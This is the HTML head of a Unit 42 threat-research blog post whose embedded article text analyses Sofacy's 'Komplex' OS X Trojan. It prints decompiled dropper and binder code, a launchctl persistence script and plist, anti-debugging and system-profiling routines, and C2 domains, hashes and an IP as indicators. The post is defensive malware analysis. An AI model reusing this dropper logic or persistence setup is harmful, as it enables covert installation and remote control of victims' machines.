<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">
    <link rel="preconnect" href="https://www.paloaltonetworks.com">
    <link rel="preconnect" href="https://cdn.cookielaw.org">
    <link rel="preconnect" href="https://fonts.googleapis.com">
	    <!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
var main_site_url = 'https://www.paloaltonetworks.com';
var maindomain_lang = 'https://www.paloaltonetworks.com';
function getParameterByName(name, url) {
		if(url == null){
		  url = window.location.href;
		}
	    name = name.replace(/[\[\]]/g, '\\$&');
	    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
		results = regex.exec(url);
	    if (!results) return null;
	    if (!results[2]) return '';
	    return decodeURIComponent(results[2].replace(/\+/g, ' '));
	}
	var container_q = getParameterByName('container');
	var d_lang = 'en';	
</script>

<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.css"></noscript>
<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.css"></noscript>
<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/deferedProductNav.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/deferedProductNav.min.css"></noscript>
  <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/unit42-sofacys-komplex-os-x-trojan/" />
<link rel="alternate" hreflang="x-default" href="https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/" />

	<!-- This site is optimized with the Yoast SEO Premium plugin v24.2 (Yoast SEO v24.2) - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Sofacy’s ‘Komplex’ OS X Trojan</title>
	<meta name="description" content="The Sofacy group uses a variety of tools to target individuals in the aerospace industry running the OS X operating system." />
	<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Sofacy’s ‘Komplex’ OS X Trojan" />
	<meta property="og:description" content="The Sofacy group uses a variety of tools to target individuals in the aerospace industry running the OS X operating system." />
	<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/" />
	<meta property="og:site_name" content="Unit 42" />
	<meta property="article:published_time" content="2016-09-26T08:00:01+00:00" />
	<meta property="article:modified_time" content="2018-11-01T10:23:28+00:00" />
	<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/blog-web-banner-650x300.jpg" />
	<meta property="og:image:width" content="650" />
	<meta property="og:image:height" content="300" />
	<meta property="og:image:type" content="image/jpeg" />
	<meta name="author" content="Dani Creus, Tyler Halfpop, Robert Falcone" />
	<meta name="twitter:card" content="summary_large_image" />
	<!-- / Yoast SEO Premium plugin. -->


<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Feed" href="https://unit42.paloaltonetworks.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Comments Feed" href="https://unit42.paloaltonetworks.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Sofacy’s ‘Komplex’ OS X Trojan Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/feed/" />
<script type="text/javascript">
var globalConfig = {};
var webData = {};
webData.channel = "unit42";
webData.property = "unit42.paloaltonetworks.com";
webData.language = "en_us";
webData.pageType = "blogs";
webData.pageName = "unit42:unit42-sofacys-komplex-os-x-trojan";
webData.pageURL = "https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan";
webData.article_title = "Sofacy’s ‘Komplex’ OS X Trojan";
webData.author = "Dani Creus,Tyler Halfpop,Robert Falcone";
webData.published_time = "2016-09-26T11:00:01-07:00";
webData.description = "The Sofacy group uses a variety of tools to target individuals in the aerospace industry running the OS X operating system.";
webData.keywords = "Malware,Threat Actor Groups,Threat Research,aerospace,Fighting Ursa,Komplex,OS X,Sofacy,Trojan";
webData.resourceAssetID = "64c41e77780c4422586b14bc7b7734bf";
</script>
<script type="text/javascript">
var globalConfig = {};
globalConfig.buildName = "UniqueResourceAssetsID_DEC022022";
</script>
<meta property="og:likes" content="8"/>
<meta property="og:readtime" content="10"/>
<meta property="og:views" content="86,126"/>
<meta property="og:date_created" content="September 26, 2016 at 11:00 AM"/>
<meta property="og:post_length" content="3158"/>
<meta property="og:category" content="Malware"/>
<meta property="og:category" content="Threat Actor Groups"/>
<meta property="og:category" content="Threat Research"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/malware/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/threat-actor-groups/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/threat-research/"/>
<meta property="og:author" content="Dani Creus"/>
<meta property="og:author" content="Tyler Halfpop"/>
<meta property="og:author" content="Robert Falcone"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/dani-creus/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/tyler-halfpop/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/robertfalcone/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta name="post_tags" content="aerospace,Fighting Ursa,Komplex,OS X,Sofacy,Trojan"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Sofacy\u2019s \u2018Komplex\u2019 OS X Trojan","name":"Sofacy\u2019s \u2018Komplex\u2019 OS X Trojan","description":"Unit 42 researchers identified a new OS X Trojan associated with the Sofacy group that we are now tracking with the 'Komplex' tag using the Palo Alto Networks AutoFocus threat intelligence platform. The Sofacy group, also known as APT28, Pawn Storm, Fancy Bear, and Sednit, continues to add","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-sofacys-komplex-os-x-trojan\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-sofacys-komplex-os-x-trojan\/","datePublished":"September 26, 2016","articleBody":"Unit 42 researchers identified a new OS X Trojan associated with the Sofacy group that we are now tracking with the 'Komplex' tag using the Palo Alto Networks AutoFocus threat intelligence platform.\r\n\r\nThe Sofacy group, also known as APT28, Pawn Storm, Fancy Bear, and Sednit, continues to add to the variety of tools they use in attacks; in this case, targeting individuals in the aerospace industry running the OS X operating system. During our analysis, we determined that Komplex was used in a previous attack campaign targeting individuals running OS X that exploited a vulnerability in the MacKeeper antivirus application to deliver Komplex as a payload. Komplex shares a significant amount of functionality and traits with another tool used by Sofacy - the Carberp variant that Sofacy had used in previous attack campaigns on systems running Windows. In addition to shared code and functionality, we also discovered Komplex command and control (C2) domains that overlapped with previously identified phishing campaign infrastructures associated with the Sofacy group.\r\nKomplex Binder\r\nKomplex is a Trojan that the Sofacy group created to compromise individuals using OS X devices. The Trojan has multiple parts, first leading with a binder component that is responsible for saving a second payload and a decoy document to the system. We found three different versions of the Komplex binder, one that was created to run on x86, another on x64, and a third that contained binders for both x86 and x64 architectures. We found the following samples of the Komplex binder:\r\n2a06f142d87bd9b66621a30088683d6fcec019ba5cc9e5793e54f8d920ab0134: Mach-O 64-\r\nbit executable x86_64\r\nc1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7: Mach-O \r\nexecutable i386\r\ncffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d4: Mach-O \r\nuniversal binary with 2 architectures\r\nRegardless of architecture, these initial binders all save a second embedded Mach-O file to \u2018\/tmp\/content\u2019. This file is the Komplex dropper used in the next stage of installation and to maintain persistence. After saving the Komplex dropper, these binders would then save a legitimate decoy document to the system and open them using the \u2018Preview\u2019 application to minimize suspicion of any malicious activity. Figure 1 shows the main function found in one of the initial droppers that saves and opens a PDF decoy, as well as executes another executable file saved as \u2018\/tmp\/content\u2019.\r\nint _main(int arg0, int arg1) {\r\n    var_28 = [[NSAutoreleasePool alloc] init];\r\n    var_38 = [NSSearchPathForDirectoriesInDomains(0xf, 0x1, 0x1) objectAtIndex:0x0];\r\n    var_40 = [NSString stringWithFormat:@\"%@\/roskosmos_2015-2025.pdf\", var_38];\r\n    var_48 = [NSString stringWithFormat:@\"SetFile -a E %@\/roskosmos_2015-2025.pdf\", \r\nvar_38];\r\n    var_50 = [NSString stringWithFormat:@\"rm -rf %@\/roskosmos_2015-2025.app\", var_38];\r\n    var_58 = [NSString stringWithFormat:@\"open -a Preview.app %@\/roskosmos_2015-\r\n2025.pdf\", var_38];\r\n    [[NSData dataWithBytes:_joiner length:0x20f74] writeToFile:@\"\/tmp\/content\" \r\natomically:0x1];\r\n    system([var_50 UTF8String]);\r\n    system(\"chmod 755 \/tmp\/content\");\r\n    [[NSData dataWithBytes:_pdf length:0x182c82] writeToFile:var_40 atomically:0x1];\r\n    system([var_48 UTF8String]);\r\n    var_70 = [[NSTask alloc] init];\r\n    [var_70 setLaunchPath:@\"\/tmp\/content\"];\r\n    [var_70 launch];\r\n    [var_70 waitUntilExit];\r\n    system([var_58 UTF8String]);\r\n    remove(*arg1);\r\n    [var_28 release];\r\n    return 0x0;\r\n}\r\n\r\nFigure 1 Main function within the Komplex binder\r\nThe binder component saves a decoy document named roskosmos_2015-2025.pdf to the system and opens it using the Preview application built into OS X. Figure 2 shows a portion of the 17 page decoy document. This document is titled \u201c\u041f\u0440\u043e\u0435\u043a\u0442 \u0424\u0435\u0434\u0435\u0440\u0430\u043b\u044c\u043d\u043e\u0439 \u043a\u043e\u0441\u043c\u0438\u0447\u0435\u0441\u043a\u043e\u0439 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u0420\u043e\u0441\u0441\u0438\u0438 \u043d\u0430 2016 - 2025 \u0433\u043e\u0434\u044b\u201d and describes the Russian Federal Space Program\u2019s projects between 2016 and 2025. We do not have detailed targeting information regarding the\u00a0 Sofacy group's attack campaign delivering Komplex at this time; however, based on the contents of the decoy document, we believe that the target is likely associated with the aerospace industry.\r\n\r\nFigure 2 Decoy document opened by Komplex binder showing document regarding the Russian Space Program\r\n\r\nKomplex Dropper\r\nThe Komplex dropper component is saved to the system as \u201c\/tmp\/content\u201d (SHA256: 96a19a90caa41406b632a2046f3a39b5579fbf730aca2357f84bf23f2cbc1fd3) and is responsible for installing a third executable to the system and setting up persistence for the third executable to launch each time the OS X operating system starts. This dropper also provided the basis for the name \u201cKomplex\u201d, which is seen in several folder paths that were included within the Mach-O file, such as \u201c\/Users\/kazak\/Desktop\/Project\/komplex\".\r\n\r\nThe Komplex dropper is fairly straightforward from a functional perspective, as it contains all of its functionality within its \u201c_main\u201d function. The \u201c_main\u201d function (Figure 3) accesses data within three variables named \u2018_Payload_1\u2019, \u2018_Payload_2\u2019 and \u2018_Payload_3\u2019, and writes them to three files on the system.\r\nint _main(int arg0, int arg1) {\r\n    var_38 = [[NSAutoreleasePool alloc] init];\r\n    var_40 = [NSData dataWithBytes:_Payload_1 length:0x15c1c];\r\n    var_48 = [NSData dataWithBytes:_Payload_2 length:0x201];\r\n    var_50 = [NSData dataWithBytes:_Payload_3 length:0x4c];\r\n    system(\"mkdir -p \/Users\/Shared\/.local\/ &amp;&gt; \/dev\/null\");\r\n    system(\"mkdir -p ~\/Library\/LaunchAgents\/ &amp;&gt; \/dev\/null\");\r\n    [var_40 writeToFile:@\"\/Users\/Shared\/.local\/kextd\" atomically:0x1];\r\n    [var_48 writeToFile:@\"\/Users\/Shared\/com.apple.updates.plist\" \r\natomically:0x1];\r\n    [var_50 writeToFile:@\"\/Users\/Shared\/start.sh\" atomically:0x1];\r\n    system(\"cp \/Users\/Shared\/com.apple.updates.plist \r\n$HOME\/Library\/LaunchAgents\/  &amp;&gt;\/dev\/null\");\r\n    remove(\"\/Users\/Shared\/com.apple.updates.plist\");\r\n    system(\"chmod 755 \/Users\/Shared\/.local\/kextd\");\r\n    system(\"chmod 755 \/Users\/Shared\/start.sh\");\r\n    var_58 = [[NSTask alloc] init];\r\n    [var_58 setLaunchPath:@\"\/Users\/Shared\/start.sh\"];\r\n    [var_58 launch];\r\n    [var_58 waitUntilExit];\r\n    remove(\"\/Users\/Shared\/start.sh\");\r\n    remove(*arg1);\r\n    [var_38 release];\r\n    return 0x0;\r\n}\r\n\r\nFigure 3 Komplex Dropper's main function that drops three files to the system and runs a shell script\r\nThe \u201c_main\u201d function writes the data within \u2018_Payload_1\u2019, \u2018_Payload_2\u2019, and \u2018_Payload_3\u2019 variables to the following files, respectively:\r\n\r\n \t\/Users\/Shared\/.local\/kextd (SHA256:\r\n227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5)\r\n \t\/Users\/Shared\/com.apple.updates.plist (SHA256:\r\n1f22e8f489abff004a3c47210a9642798e1c53efc9d6f333a1072af4b11d71ef)\r\n \t\/Users\/Shared\/start.sh (SHA256:\r\nd494e9f885ad2d6a2686424843142ddc680bb5485414023976b4d15e3b6be800)\r\n\r\nThe shell script saved to \u2018\/Users\/Shared\/start.sh\u2019 calls the system command \u2018launchctl\u2019 to add a plist entry into \u2018launchd\u2019 to automatically execute the Komplex payload each time the system starts. Figure 4 shows the contents of the \u2018start.sh\u2019 script that sets up persistence for the payload.\r\n#!\/bin\/sh\r\nlaunchctl load -w ~\/Library\/LaunchAgents\/com.apple.updates.plist\r\n\r\nFigure 4 Contents of the start.sh shell script that calls launchctl\r\nThe \u2018start.sh\u2019 script loads \u2018com.apple.updates.plist\u2019, which sets the properties of the Komplex payload that is executed from \u201c\/Users\/Shared\/.local\/kextd\u201d at system start up courtesy of the \u201cRunAtLoad\u201d parameter. \u00a0Figure 5 shows the contents of the \u2018com.apple.updates.plist\u2019 file loaded into \u2018launchd\u2019.\r\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\r\n&lt;!DOCTYPE plist PUBLIC \"-\/\/Apple\/\/DTD PLIST 1.0\/\/EN\" \r\n\"http:\/\/www.apple.com\/DTDs\/PropertyList-1.0.dtd\"&gt;\r\n&lt;plist version=\"1.0\"&gt;\r\n&lt;dict&gt;\r\n\t&lt;key&gt;Label&lt;\/key&gt;\r\n\t&lt;string&gt;com.apple.updates&lt;\/string&gt;\r\n\t&lt;key&gt;ProgramArguments&lt;\/key&gt;\r\n\t&lt;array&gt;\r\n\t\t&lt;string&gt;\/Users\/Shared\/.local\/kextd&lt;\/string&gt;\r\n\t&lt;\/array&gt;\r\n\t&lt;key&gt;KeepAlive&lt;\/key&gt;\r\n\t&lt;false\/&gt;\r\n\t&lt;key&gt;RunAtLoad&lt;\/key&gt;\r\n\t&lt;true\/&gt;\r\n\t&lt;key&gt;StandardErrorPath&lt;\/key&gt;\r\n\t&lt;string&gt;\/dev\/null&lt;\/string&gt;\r\n\t&lt;key&gt;StandardOutPath&lt;\/key&gt;\r\n\t&lt;string&gt;\/dev\/null&lt;\/string&gt;\r\n&lt;\/dict&gt;\r\n&lt;\/plist&gt;\r\n\r\nFigure 5 Contents of the com.apple.updates.plist file showing how the dropper achieves persistence\r\n\r\nKomplex Payload\r\nThe ultimate purpose of the aforementioned components is to install and execute the Komplex payload. The dropper component saves the payload to \"\/Users\/Shared\/.local\/kextd\" (SHA256: 227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5) and ultimately executes the payload. The payload begins by conducting an anti-debugging check to see if it is being debugged before proceeding with executing its main functionality, which can be seen in the \u201cAmIBeingDebugged\u201d function in Figure 6. The \u201cAmIBeingDebugged\u201d function uses the \u201csysctl\u201d function to check to see if a specific \u201cP_TRACED\u201d flag is set, which signifies that the process is being debugged. A particularly interesting part of this function is that it is very similar to the function provided by Apple to its developers in a guide created in 2004 titled \u201cDetecting the Debugger\u201d. This is not the first time the Sofacy group's malware authors have obtained techniques from publicly available sources, as demonstrated in the use of the Office Test Persistence Method that they obtained from a blog posted in 2014.\r\nint AmIBeingDebugged()() {\r\n    var_8 = **__stack_chk_guard;\r\n    getpid();\r\n    if ((((sysctl(0x1, 0x4, var_2A8, 0x288, 0x0, 0x0) == 0x0 ? 0x1 : 0x0) ^ 0x1) &amp; 0x1 \r\n&amp; 0xff) != 0x0) {\r\n            rax = __assert_rtn(\"AmIBeingDebugged\", \r\n\"\/Users\/user\/Desktop\/LoaderWinApi\/LoaderWinApi\/main.mm\", 0x21, \"junk == 0\");\r\n    }\r\n    else {\r\n            var_2C1 = (0x0 &amp; 0x800) != 0x0 ? 0x1 : 0x0;\r\n            if (**__stack_chk_guard == var_8) {\r\n                    rax = var_2C1 &amp; 0x1 &amp; 0xff;\r\n            }\r\n            else {\r\n                    rax = __stack_chk_fail();\r\n            }\r\n    }\r\n    return rax;\r\n}\r\n\r\nFigure 6 The AmIBeingDebugged function used as an anti-analysis technique\r\nAfter determining that it is not running in a debugger, the payload performs an anti-analysis\/sandbox check by issuing a GET request to Google, to check for Internet connectivity. The payload will sleep until it receives a response from the HTTP requests to Google, which means Komplex will only communicate to its C2 servers in Internet enabled environments. Figure 7 shows the \u201cconnectedToInternet\u201d function that confirms whether the payload is able to communicate with \u201chttp:\/\/www.google.com\u201d before carrying out its functionality.\r\nint connectedToInternet()() {\r\n    if ([NSData dataWithContentsOfURL:[NSURL \r\nURLWithString:@\"http:\/\/www.google.com\"]] != 0x0) {\r\n            var_1 = 0x1;\r\n    }\r\n    else {\r\n            var_1 = 0x0;\r\n    }\r\n    rax = var_1 &amp; 0x1 &amp; 0xff;\r\n    return rax;\r\n}\r\n\r\nFigure 7 The connectedToInternet function testing for an active Internet connection\r\nAfter confirming an active Internet connection, the Komplex payload begins carrying out its main functionality. The Komplex payload uses an 11-byte XOR algorithm to decrypt strings used for configuration and within C2 communications, including the C2 domains themselves. Figure 8 shows a screenshot of Komplex\u2019s custom string decryption algorithm, along with the XOR key used to decrypt strings within the payload.\r\n\r\nFigure 8 11-byte XOR algorithm used by Komplex to decrypt configuration strings\r\nThe algorithm seen in Figure 8 decrypts the strings seen in Table 1, which the payload references using the associated variable names. The payload uses these decrypted strings for a variety of purposes, such as command parsing and C2 server locations.\r\n\r\n\r\n\r\n\r\n\r\n\r\nVariable Name\r\nDecrypted String\r\n\r\n\r\nFILE_NAME\r\nFileName\r\n\r\n\r\nPATHTOSAVE\r\nPathToSave\r\n\r\n\r\nSTART_BLOCK_FILE\r\n[file]\r\n\r\n\r\nBLOCK_EXECUTE\r\nExecute\r\n\r\n\r\nBLOCK_DELETE\r\nDelete\r\n\r\n\r\nEND_BLOCK_FILE\r\n[\/file]\r\n\r\n\r\nSERVERS\r\nappleupdate[.]org, apple-iclouds[.]net, itunes-helper[.]net\r\n\r\n\r\nMAC\r\nmac\r\n\r\n\r\nCONFIG\r\nconfig\r\n\r\n\r\nGET_CONFIG\r\n1\r\n\r\n\r\nFILES\r\nfile\r\n\r\n\r\nLOG\r\nlog\r\n\r\n\r\nOLD_CONFIG\r\n2\r\n\r\n\r\nID\r\nid\r\n\r\n\r\nTOKEN\r\nh8sn3vq6kl\r\n\r\n\r\nEXTENSIONS\r\n.xml .pdf, .htm, .zip\r\n\r\n\r\n\r\n\r\n\r\nTable 1 Strings decrypted by Komplex and their referenced name\r\nThe Komplex payload uses the SERVERS variable to obtain the location of its C2, which it communicates with using HTTP POST requests. The payload generates a URL to communicate with its C2 server that has the following structure:\r\n\r\n\/&lt;random path&gt;\/&lt;random string&gt;.&lt;chosen extension&gt;\/?&lt;random string&gt;=&lt;encrypted token&gt;\r\n\r\nThe &lt;chosen extension&gt; portion of the URL is chosen at random from the list of legitimate file extensions: .xml, .zip, .htm and .pdf. The &lt;encrypted token&gt; within the parameters of the URL is base64 encoded ciphertext created from the string \u2018h8sn3vq6kl\u2019. The ciphertext of the string is generated via a custom algorithm that uses a random 4-byte integer as a key that is modified by XOR with the static value 0xE150722. The payload also encrypts the data sent within the POST request using the same algorithm and encodes it using base64. Figure 9 below shows an example HTTP POST sent from the payload to its C2 server.\r\n\r\n\r\nFigure 9 Beacon sent from Komplex to C2 containing system information within the HTTP POST data\r\nThe HTTP POST data in Figure 9 is comprised of information that the malware collects from the infected system. The system information sent to the C2 includes data such as the system version, username, and process list, which is gathered within a function named \u201cgetOsInfo\u201d within the \u201cInfoOS\u201d class (Figure 10).\r\nint InfoOS::getOsInfo()() {\r\n    var_38 = rdi;\r\n    var_18 = [[NSProcessInfo processInfo] operatingSystemVersionString];\r\n    var_20 = NSUserName();\r\n    var_28 = InfoOS::getProcessList();\r\n    var_30 = operator new[](strlen(var_28) + 0x200);\r\n    sprintf(var_30, \"Mac OS X - %s %s\\nUser name - %s\\n\\t\\t\\t\\t\\t\\tProcess \r\nlist :\\n\\n%s\", [var_18 UTF8String], InfoOS::bitOS(), [var_20 UTF8String], \r\nvar_28);\r\n    rax = var_30;\r\n    return rax;\r\n}\r\n\r\nFigure 10 getOsInfo function within Komplex that gathers system information for C2 beacon\r\nThe Sofacy C2 server will respond to this HTTP request with encrypted data that the payload will decrypt using the same custom algorithm used to encrypt the POST data. The Komplex payload will parse the C2 response for the following strings: \"[file]\" and \"[\/file]\", \"FileName=\", \"PathToSave=\", \"Shell=\", \"Execute\", and \"Delete\". The \"Delete\" action does nothing more than delete a file specified by 'PathToSave'\/'FileName', whereas the \"Execute\" action involves running the following system commands before executing the specified file:\r\nmkdir -p &lt;'PathToSave'&gt; &amp;&gt; \/dev\/null\r\nchmod 755 &lt;'PathToSave'&gt;\/&lt;'FileName'&gt; &amp;&gt; \/dev\/null\r\n\r\nThe payload will treat \"[file]\" and \"[\/file]\" as delimiters that specify the data that the payload should write to a specified file, which allows the threat actor to download additional files to the system. Lastly, the payload can execute commands on the compromised system specified within the \"Shell\" field, which the payload will execute and then send results back to the C2.\r\nConnections to Sofacy and Previous Attacks.\r\nCode Overlaps\r\n\r\nWhile reverse engineering the Komplex payload, we came across a few code overlaps that we believed were worth exploring. First, we noticed striking similarities between the Komplex payload and the traits and behavior of an OS X Trojan discussed in a BAE Systems blog titled NEW MAC OS MALWARE EXPLOITS MACKEEPER. According to this blog post, an OS X Trojan was delivered via a vulnerability in the MacKeeper application. The nameless OS X Trojan uses an 11-byte XOR algorithm to decrypt an embedded configuration, which has all of the same variable names and values as the Komplex sample (see Table 1). The algorithm used to encrypt and decrypt the network traffic, as well as all static elements of the network communications (composition of URL, structure of HTTP data, command parsing procedure, etc.) discussed in the blog post are the exact same as seen in the Komplex payload. These overlaps suggest that the Trojan delivered by the MacKeeper vulnerability was in fact the Komplex Trojan.\r\n\r\nThe second code overlap ties the Komplex Trojan to Sofacy\u2019s Carberp variant, which we have analyzed in previous research efforts. Even though Komplex was created to run on OS X and Sofacy\u2019s Carberp variant was developed to run on Windows, they share many commonalities, including:\r\n\r\n \tSame URL generation logic using random path values, a random file extension and encrypted token\r\n \tSame file extensions used in C2 URL that are listed within the binaries in the same order\r\n \tSame algorithm used to encrypt and decrypt the token in the URL and HTTP POST data (Carberp key is modified using value 0xAA7D756 whereas Komplex uses 0xE150722)\r\n \tVery similar command handling, including parsing specifically for Execute, Delete, [file], [\/file], FileName, and PathToSave.\r\n \tChecks for Internet connectivity by connecting to google.com\r\n \tUses an 11-byte XOR key to decrypt strings within the configuration\r\n\r\nIn addition to these common traits, we found a Sofacy Carberp variant (SHA256: 638e7ca68643d4b01432f0ecaaa0495b805cc3cccc17a753b0fa511d94a22bdd) using the same TOKEN value of \u2018h8sn3vq6kl\u2019 within its C2 URL, as observed in Komplex payloads. Based on these observations, we believe that the author of Sofacy\u2019s Carberp variant used the same code, or at least the same design, to create the Komplex Trojan. A benefit of retaining many of the same functionalities within the Windows and OS X Trojans is that it would require fewer alterations to the C2 server application to handle cross-platform implants.\r\n\r\nInfrastructure Overlap\r\n\r\nWhile Komplex\u2019s C2 domain appleupdate[.]org does not appear to have any previously known activity associated with it, both the apple-iclouds[.]net and itunes-helper[.]net domains have direct ties to Sofacy activity. The apple-iclouds[.]net domain is mentioned within a PwC Tactical Intelligence Bulletin that discussed a phishing campaign conducted by the Sofacy group. The itunes-helper[.]net domain is associated with separate activity discussed in Trend Micro\u2019s blog titled Looking Into a Cyber-Attack Facilitator in the Netherlands that included research on hosting providers used by Pawn Storm (Sofacy).\r\n\r\nThe domain appleupdate[.]org does have one interesting correlation point, specifically involving the IP 185.10.58[.]170 that resolved this domain between April 2015 through April 2016. Researchers at BAE Systems provided Unit 42 the Komplex payload delivered through the exploitation of MacKeeper (Dropper SHA256: da43d39c749c121e99bba00ce809ca63794df3f704e7ad4077094abde4cf2a73 and Payload SHA256: 45a93e4b9ae5bece0d53a3a9a83186b8975953344d4dfb340e9de0015a247c54), which used the IP address 185.10.58[.]170 within its configuration as a C2 server. This infrastructure overlap further strengthens the connection between the Komplex payload we discovered with the prior campaign using MacKeeper for delivery.\r\nConclusion\r\nThe Sofacy group created the Komplex Trojan to use in attack campaigns targeting the OS X operating system \u2013 a move that showcases their continued evolution toward multi-platform attacks. The tool is capable of downloading additional files to the system, executing and deleting files, as well as directly interacting with the system shell. While detailed targeting information is not currently available, we believe Komplex has been used in attacks on individuals related to the aerospace industry, as well as attacks leveraging an exploit in MacKeeper to deliver the Trojan. The Komplex Trojan revealed a design similar to Sofacy\u2019s Carberp variant Trojan, which we believe may have been done in order to handle compromised Windows and OS X systems using the same C2 server application with relative ease.\r\n\r\nWhile Unit 42 continues to research and track this threat, Palo Alto Networks customers are protected via the following:\r\n\r\n \tWildFire correctly identifies known Komplex executables as malicious\r\n \tIPS signature #14442 Sofacy.Gen Command And Control Traffic can detect and block outbound C2 requests generated by the Komplex Trojan.\r\n \tCustomers can track this Trojan via the Komplex tag in AutoFocus.\r\n\r\nIOCs:\r\nHashes:\r\n2a06f142d87bd9b66621a30088683d6fcec019ba5cc9e5793e54f8d920ab0134\r\nc1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7\r\ncffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d4\r\n96a19a90caa41406b632a2046f3a39b5579fbf730aca2357f84bf23f2cbc1fd3\r\n227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5\r\n45a93e4b9ae5bece0d53a3a9a83186b8975953344d4dfb340e9de0015a247c54\r\n\r\nC2 Locations:\r\nappleupdate[.]org\r\napple-iclouds[.]net\r\nitunes-helper[.]net\r\n185.10.58.170","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2016\/09\/blog-web-banner-650x300-300x300.jpg","width":300,"height":300},"speakable":{"@type":"SpeakableSpecification","xPath":["\/html\/head\/title","\/html\/head\/meta[@name='description']\/@content"]},"author":[{"@type":"Person","name":"Dani Creus"},{"@type":"Person","name":"Tyler Halfpop"},{"@type":"Person","name":"Robert Falcone"}]}</script><link rel='stylesheet' id='crayon-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' media='all' />
<style id='co-authors-plus-coauthors-style-inline-css'>
.wp-block-co-authors-plus-coauthors.is-layout-flow [class*=wp-block-co-authors-plus]{display:inline}

</style>
<style id='co-authors-plus-avatar-style-inline-css'>
.wp-block-co-authors-plus-avatar :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-avatar :where(img){vertical-align:middle}.wp-block-co-authors-plus-avatar:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-avatar.aligncenter{display:table;margin-inline:auto}

</style>
<style id='co-authors-plus-image-style-inline-css'>
